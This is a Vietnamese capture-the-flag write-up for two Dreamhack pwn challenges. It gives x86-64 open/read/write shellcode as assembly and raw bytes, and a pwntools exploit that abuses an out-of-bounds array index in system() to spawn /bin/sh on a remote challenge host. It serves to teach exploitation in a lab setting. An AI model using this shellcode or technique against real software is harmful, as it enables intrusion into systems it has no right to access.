# shell_basic

## Ý tưởng

Theo đề bài là ta sẽ phải tạo một shellcode để lấy flag ở `/home/shell_basic/flag_name_is_loooooong` thì chúng ta cần các như: syscall_open (để mở file), syscall_read (để đọc dữ liệu), syscall_write (để ghi ra màn hình) và exit

## Thực thi

- Khi tham khảo các wu em thấy có khái niệm opcode, được hiểu mơ hồ là một loại mã cho máy biết phải làm gì, tức là phải thực hiện thao tác nào. Opcode là một loại hướng dẫn ngôn ngữ máy.
- asm của nó là `push 0`

### syscall_open

![image](https://user-images.githubusercontent.com/111769169/226924551-6462ae35-9e2e-411e-b527-31af3f71d8fb.png)

- rdi: địa chỉ file `/home/shell_basic/flag_name_is_loooooong`
- rsi = 0
- rdx = 0

Đầu tiên ta sẽ push đường dẫn file flag vào stack

```asm
    push 1
    mov rax, 0x676E6F6F6F6F6F6F         ;"oooooong"
    push rax
    mov rax, 0x6C5F73695F656D61         ;'ame_is_l'
    push rax
    mov rax, 0x6E5F67616C662F63         ; 'c/flag_n'
    push rax
    mov rax, 0x697361625f6c6c65         ; 'ell_basi'
    push rax
    mov rax, 0x68732f656d6f682f         ; '/home/sh'
    push rax
```

Sau đó ta sẽ setup các thanh ghi sao cho

- rax = 0x2
- rdi = `/home/shell_basic/flag_name_is_loooooong`
- rsi = 0 (RD_ONLY)
- rdx = 0

```asm
    ;set sys_open
    mov rax, 0x2
    mov rdi, rsp                        ; RD_only
    xor rsi, rsi
    xor rdx, rdx
    syscall
```

### sys_read

![image](https://user-images.githubusercontent.com/111769169/226928405-d4f75f67-4b87-4388-8361-83ade81bed20.png)
Ta sẽ setup:

- rax : 0x00
- rdi : là đặc tả file (fd)
- rsi : buf
- rdx : len

```asm
    mov rdi, rax
    mov rsi, rsp
    sub rsi, 0x30                       ; rsi = rsp - 0x30, buf
    mov rdx, 0x30                       ; rdx = 0x30, len
    mov rax, 0x0                        ; rax = 0
    syscall
```

### sys_write

![image](https://user-images.githubusercontent.com/111769169/226931783-591deeef-3e02-4fe8-a90f-152f4f0109df.png)
Ta cần setup các thanh ghi:

- rax : 0x01
- rdi : fd
- rsi : buf
- rdx : len

```asm
    mov rax, 0x1
    mov rdi, 1      ; fd = stdout
    syscall
```

sau đó ta dùng tool [link](https://defuse.ca/) để đổi asm thành mã máy
`\x6a\x00\x48\xB8\x6F\x6F\x6F\x6F\x6F\x6F\x6E\x67\x50\x48\xB8\x61\x6D\x65\x5F\x69\x73\x5F\x6C\x50\x48\xB8\x63\x2F\x66\x6C\x61\x67\x5F\x6E\x50\x48\xB8\x65\x6C\x6C\x5F\x62\x61\x73\x69\x50\x48\xB8\x2F\x68\x6F\x6D\x65\x2F\x73\x68\x50\x48\xC7\xC0\x02\x00\x00\x00\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05\x48\x89\xC7\x48\x89\xE6\x48\x83\xEE\x30\x48\xC7\xC2\x30\x00\x00\x00\x48\xC7\xC0\x00\x00\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x0F\x05`

<details> <summary> script asm </summary>

```asm
    push 0x0
    mov rax, 0x676E6F6F6F6F6F6F         ;"oooooong"
    push rax
    mov rax, 0x6C5F73695F656D61         ;'ame_is_l'
    push rax
    mov rax, 0x6E5F67616C662F63         ; 'c/flag_n'
    push rax
    mov rax, 0x697361625f6c6c65         ; 'ell_basi'
    push rax
    mov rax, 0x68732f656d6f682f         ; '/home/sh'
    push rax

    ;set sys_open
    mov rax, 0x2
    mov rdi, rsp                        ; RD_only
    xor rsi, rsi
    xor rdx, rdx
    syscall

    ;set sys_read
    mov rdi, rax
    mov rsi, rsp
    sub rsi, 0x30                       ; rsi = rsp - 0x30, buf
    mov rdx, 0x30                       ; rdx = 0x30, len
    mov rax, 0x0                        ; rax = 0
    syscall

    mov rax, 0x1
    mov rdi, 1      ; fd = stdout
    syscall
```

</details>

# out_of_bound

## source

<details> <summary> source C </summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char \*command[10] = { "cat",
"ls",
"id",
"ps",
"file ./oob" };
void alarm_handler()
{
puts("TIME OUT");
exit(-1);
}

void initialize()
{
setvbuf(stdin, NULL, \_IONBF, 0);
setvbuf(stdout, NULL, \_IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);

}

int main()
{
int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;

}
```

</details>

## Ý tưởng

- Ở đây, ta chú ý đoạn code này, ở đây chúng ta nhận `idx` là 0, 1, 2 để thông qua system thực hiện các lệnh ls, id, ...
- Tuy vậy ta hoàn toàn có thể truy cập các giá trị ngoài mảng `command`

```c
    char \*command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };

    scanf("%d", &idx);

    system(command[idx]);
```

- Thông qua ida ta kiểm được địa chỉ mảng `command` và mảng `name`, và khi trừ thì ta thấy mảng `command` được khai báo trước mảng `name`

```
>>> name = 0x804A0AC
>>> command = 0x804A060
```

- Đến đây, ta có thể đoán được ta sẽ truyền chuỗi `/bin/sh` vào `name`, sau đó ta nhập vào giá trị `idx` tại chuỗi `/bin/sh`

## Thực thi

- Đầu tiên ta sẽ tìm giá trị `idx`

```
>>> name - command
76
>>> 76/4
19.0
```

- Vậy tại vị trí `command[19]` ta sẽ truyền vào chuỗi `/bin/sh` vào main và chạy thử, và lỗi =))

```
Admin name: /bin/sh
What do you want?: 19
```

- Ta thử gdb và dừng ngay hàm system

![image](https://user-images.githubusercontent.com/111769169/227205825-b4c943fb-7028-43a2-9bdd-1d9657a7d41a.png)

- Ở đây system chỉ thực hiện chuỗi `/bin`, để chắc chắc ta sẽ kiểm tra ida và kết quả là: `system((&command)[v4[0]]);`

- Vậy ta sẽ truyền `v4[0]` là địa chỉ của chuỗi `/bin/sh`,để khi thực hiện system, chương trình lấy chuỗi `/bin/sh`

- Do file 32bit mà cuỗi `/bin/sh` có 7 byte nên em thêm byte null vào cuối chuỗi tránh bị lỗi, nối chuỗi /bin/sh vào các chuỗi khác
<details> <summary> script </summary>

```python
from pwn import *

from pwn import *

exe = ELF("./out_of_bound")
# r = process(exe.path)
r = remote("host3.dreamhack.games", 18672)
name = 0x804A0AC + 4
payload = p32(name) + b"/bin/sh\0"

r.sendlineafter(b"name: ", payload)
r.sendlineafter(b"want?: ", b"19")

r.interactive()
# DH{2524e20ddeee45f11c8eb91804d57296}
```

</details>
